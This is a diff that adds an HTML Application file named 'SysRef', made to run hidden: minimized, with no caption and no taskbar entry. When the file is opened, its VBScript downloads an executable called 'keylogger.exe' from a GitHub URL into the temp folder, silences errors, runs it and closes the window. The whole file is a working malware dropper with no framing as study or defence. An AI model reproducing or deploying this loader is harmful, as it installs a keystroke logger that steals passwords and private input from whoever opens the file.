@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+<HTA:APPLICATION 
+  ID="SysRef"
+  APPLICATIONNAME="SysRef"
+  WINDOWSTATE="minimize"
+  MAXIMIZEBUTTON="no"
+  MINIMIZEBUTTON="no"
+  CAPTION="no"
+  SHOWINTASKBAR="no">
+</head>
+
+<script language="VBScript">
+Option Explicit
+
+Sub Window_OnLoad()
+    Const sURL = "https://github.com/sleakly/HTASAMPLE-PROJECT/blob/main/keylogger.exe"
+
+    Dim fso, sLocalPath
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    sLocalPath = fso.BuildPath(CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%"), "keylogger.exe")
+
+    Dim xHttp, bStrm
+    On Error Resume Next
+
+    Set xHttp = CreateObject("MSXML2.XMLHTTP")
+    xHttp.Open "GET", sURL, False
+    xHttp.setRequestHeader "User-Agent", "Mozilla/5.0"
+    xHttp.Send
+
+    If xHttp.Status = 200 Then
+        Set bStrm = CreateObject("ADODB.Stream")
+        With bStrm
+            .Type = 1 ' adTypeBinary
+            .Open
+            .Write xHttp.ResponseBody
+            .SaveToFile sLocalPath, 2 ' adSaveCreateOverWrite
+            .Close
+        End With
+    End If
+
+    Set bStrm = Nothing
+    Set xHttp = Nothing
+    Set fso = Nothing
+
+        ' Run the downloaded file
+        Dim shell
+        Set shell = CreateObject("WScript.Shell")
+        shell.Run Chr(34) & sLocalPath & Chr(34), 1, False
+        Set shell = Nothing
+
+        window.close
+End Sub
+</script>
+</html>
